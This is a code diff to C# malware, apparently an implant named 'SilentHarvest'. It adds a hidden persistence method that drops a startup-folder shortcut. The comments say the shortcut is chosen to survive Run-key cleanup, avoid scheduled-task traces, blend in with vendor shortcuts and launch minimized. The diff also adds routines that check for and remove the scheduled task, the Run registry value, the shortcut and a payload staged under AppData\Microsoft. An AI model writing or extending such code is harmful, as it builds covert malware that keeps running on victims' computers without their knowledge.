@@ -1066,7 +1066,102 @@ namespace SilentHarvest
             }
             catch { }
 
-            return "task=" + taskOk + ",run=" + runOk + ",path=" + dst;
+            // 3) startup-folder shortcut (.lnk) -- survives Run-key cleanup,
+            // no schtasks artifacts, blends into the dozens of vendor lnks
+            bool lnkOk = false;
+            try
+            {
+                string startup = Environment.GetFolderPath(
+                    Environment.SpecialFolder.Startup);
+                if (!string.IsNullOrEmpty(startup))
+                {
+                    string lnk = Path.Combine(startup, pname + ".lnk");
+                    lnkOk = CreateShortcut(lnk, dst) == null;
+                }
+            }
+            catch { }
+
+            return "task=" + taskOk + ",run=" + runOk + ",lnk=" + lnkOk
+                 + ",path=" + dst;
+        }
+
+        // returns null on success, else an error string
+        static string CreateShortcut(string lnkPath, string target)
+        {
+            try
+            {
+                Type t = Type.GetTypeFromProgID("WScript.Shell");
+                if (t == null) return "no-wscript";
+                object shell = Activator.CreateInstance(t);
+                object sc = t.InvokeMember("CreateShortcut",
+                    System.Reflection.BindingFlags.InvokeMethod, null, shell,
+                    new object[] { lnkPath });
+                sc.GetType().InvokeMember("TargetPath",
+                    System.Reflection.BindingFlags.SetProperty, null, sc,
+                    new object[] { target });
+                sc.GetType().InvokeMember("WorkingDirectory",
+                    System.Reflection.BindingFlags.SetProperty, null, sc,
+                    new object[] { Path.GetDirectoryName(target) });
+                sc.GetType().InvokeMember("WindowStyle",
+                    System.Reflection.BindingFlags.SetProperty, null, sc,
+                    new object[] { 7 });   // minimized -- less visible
+                sc.GetType().InvokeMember("Save",
+                    System.Reflection.BindingFlags.InvokeMethod, null, sc, null);
+                return null;
+            }
+            catch (Exception e) { return e.Message; }
+        }
+
+        public static string StagedPath(string pname)
+        {
+            return Path.Combine(
+                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                "Microsoft", pname + ".exe");
+        }
+
+        public static string RemovePersistence(string pname)
+        {
+            string[] done = new string[3];
+            try
+            {
+                ProcessStartInfo psi = new ProcessStartInfo("schtasks",
+                    "/Delete /F /TN " + pname);
+                psi.CreateNoWindow = true; psi.UseShellExecute = false;
+                psi.RedirectStandardOutput = true; psi.RedirectStandardError = true;
+                using (Process p = Process.Start(psi)) { p.WaitForExit(6000); }
+                done[0] = "task";
+            }
+            catch { }
+            try
+            {
+                Microsoft.Win32.Registry.CurrentUser
+                    .OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true)
+                    .DeleteValue(pname, false);
+                done[1] = "run";
+            }
+            catch { }
+            try
+            {
+                string lnk = Path.Combine(Environment.GetFolderPath(
+                    Environment.SpecialFolder.Startup), pname + ".lnk");
+                if (File.Exists(lnk)) File.Delete(lnk);
+                done[2] = "lnk";
+            }
+            catch { }
+            try
+            {
+                string dst = StagedPath(pname);
+                if (File.Exists(dst))
+                {
+                    // rename-then-delete: staged copy may be running (us)
+                    string tmp = dst + ".old";
+                    try { File.Delete(tmp); } catch { }
+                    File.Move(dst, tmp);
+                    try { File.Delete(tmp); } catch { }
+                }
+            }
+            catch { }
+            return "removed:" + string.Join(",", done);
         }
 
         public static string CheckPersistence(string pname)
@@ -1082,6 +1177,13 @@ namespace SilentHarvest
             catch { }
             try
             {
+                string lnk = Path.Combine(Environment.GetFolderPath(
+                    Environment.SpecialFolder.Startup), pname + ".lnk");
+                if (File.Exists(lnk)) s += (s.Length > 0 ? "," : "") + "lnk";
+            }
+            catch { }
+            try
+            {
                 ProcessStartInfo psi = new ProcessStartInfo("schtasks", "/Query /TN " + pname);
                 psi.CreateNoWindow = true; psi.UseShellExecute = false;
                 psi.RedirectStandardOutput = true; psi.RedirectStandardError = true;
@@ -1092,6 +1194,7 @@ namespace SilentHarvest
                 }
             }
             catch { }
+            if (s.Length == 0 && File.Exists(StagedPath(pname))) s = "staged-only";
             return s.Length > 0 ? s : "none";
         }
 
